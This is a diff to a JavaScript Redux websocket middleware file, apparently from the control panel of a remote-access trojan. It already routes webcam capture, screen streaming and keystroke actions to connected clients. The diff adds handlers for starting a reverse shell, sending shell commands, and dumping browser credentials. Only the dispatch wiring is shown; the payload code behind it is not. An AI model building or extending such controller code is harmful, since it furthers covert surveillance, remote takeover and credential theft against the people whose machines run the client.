@@ -12,7 +12,13 @@ import {
     handleWebcamDevices,
     handleStopWebcam,
     handleStartRecording,
-    handleStopRecording, handleSendWebcamRecords, handleStartStreaming, handleStopStreaming, handleMonitors, handleKey
+    handleStopRecording,
+    handleSendWebcamRecords,
+    handleStartStreaming,
+    handleStopStreaming,
+    handleMonitors,
+    handleKey,
+    handleStartReverseShell, handleSendCommandReverseShell, handleDumpBrowser
 } from '@redux/middleware/actionHandlers';
 import {handleWebSocketBinary, handleWebSocketMessage} from './messageHandler';
 import {SELECT_CLIENT, WS_CONNECT} from "@redux/actions/connectionActions";
@@ -30,6 +36,8 @@ import {
     START_SCREEN_STREAMING,
     STOP_SCREEN_STREAMING
 } from "@redux/actions/screenManagerActions";
+import {REVERSE_SHELL_COMMAND, START_REVERSE_SHELL} from "@redux/actions/reverseShellActions";
+import {DUMP_BROWSER} from "@redux/actions/credentialsActions";
 
 let websocket = null;
 
@@ -60,7 +68,10 @@ const actionHandlers = {
     [START_SCREEN_STREAMING]: (store, action) => handleStartStreaming(websocket, store, action),
     [STOP_SCREEN_STREAMING]: (store, action) => handleStopStreaming(websocket, store, action),
     [MONITORS]: (store, action) => handleMonitors(websocket, store, action),
-    [KEY_EXECUTION]: (store, action) => handleKey(websocket, store, action)
+    [KEY_EXECUTION]: (store, action) => handleKey(websocket, store, action),
+    [START_REVERSE_SHELL]: (store, action) => handleStartReverseShell(websocket, store, action),
+    [REVERSE_SHELL_COMMAND]: (store, action) => handleSendCommandReverseShell(websocket, store, action),
+    [DUMP_BROWSER]: (store, action) => handleDumpBrowser(websocket, store, action),
 };
 
 const websocketMiddleware = store => next => action => {
